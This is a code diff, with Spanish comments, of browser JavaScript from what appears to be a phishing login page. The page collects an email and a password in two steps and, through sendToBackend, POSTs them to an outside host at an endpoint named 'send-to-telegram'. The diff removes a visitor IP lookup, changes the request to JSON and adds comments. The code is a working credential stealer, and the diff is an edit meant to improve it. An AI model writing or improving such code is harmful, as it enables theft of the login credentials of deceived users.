@@ -2,25 +2,23 @@ var counter = 0;
 var email, password;
 
 async function sendToBackend(email, password) {
+    const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
+
+    // Datos a enviar
+    const data = {
+        email: email,
+        password: password
+    };
+
+    console.log("Enviando datos al backend:", data);  // Log para confirmar datos
+
     try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ipv4 = ipData.ip;
-
-        const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
-        
-        const data = {
-            email: email,
-            password: password,
-            ip: ipv4
-        };
-
-        console.log("Enviando datos al backend:", data);
-
+        // Enviar datos al backend
         const response = await fetch(url, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'  // Cambia a 'application/json' si el backend lo necesita
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
             },
             body: JSON.stringify(data)
         });
@@ -43,6 +41,7 @@ window.onload = function() {
     var input = document.getElementById("input1");
     
     if(screen.width <= 450) {
+        // Configuración de estilo en pantalla pequeña
         var box = document.getElementById('box');
         var grid = document.getElementById('grid-container');
         var email = document.getElementById('email');
@@ -112,7 +111,7 @@ function enter() {
     else if (counter == 1) {
         password = document.getElementById('input1').value;
         counter++;
-        sendToBackend(email, password); 
+        sendToBackend(email, password);  // Llamada a la función modificada
         change2();
     }
 }
